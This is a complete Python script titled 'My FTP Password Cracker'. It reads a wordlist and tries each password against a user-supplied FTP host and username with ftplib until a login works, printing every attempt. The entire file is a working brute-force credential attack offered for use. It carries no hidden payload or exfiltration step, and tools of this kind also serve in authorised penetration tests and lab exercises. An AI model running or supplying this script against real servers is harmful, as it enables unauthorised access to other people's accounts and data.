import pyfiglet
from ftplib import FTP

def print_header():
    header = pyfiglet.figlet_format("My FTP Password Cracker")
    print(header)

def attempt_ftp_login(host, username, password, port=21):
    ftp = FTP()
    try:
        print(f"Attempting to connect to {host}:{port} with username: {username} and password: {password}")
        ftp.connect(host, port, timeout=10)
        ftp.login(username, password)
        print(f"[+] Login successful with {username}:{password}")
        ftp.quit()
        return True
    except Exception as e:
        print(f"[-] Failed login with {username}:{password} - {e}")
        return False

def crack_password(host, username, passwords, port=21):
    for password in passwords:
        if attempt_ftp_login(host, username, password, port):
            break

def read_passwords(file):
    try:
        with open(file, 'r') as f:
            passwords = f.read().splitlines()
        return passwords
    except FileNotFoundError:
        print(f"[-] The file {file} was not found.")
        return []

def main():
    print_header()
    
    host = input("Enter the FTP server address: ")
    username = input("Enter the FTP username: ")
    password_file = input("Enter the path to the password file: ")
    port = input("Enter the FTP port (default is 21): ")
    port = int(port) if port else 21

    passwords = read_passwords(password_file)

    if passwords:
        crack_password(host, username, passwords, port)
    else:
        print("[-] No passwords to try.")

if __name__ == "__main__":
    main()
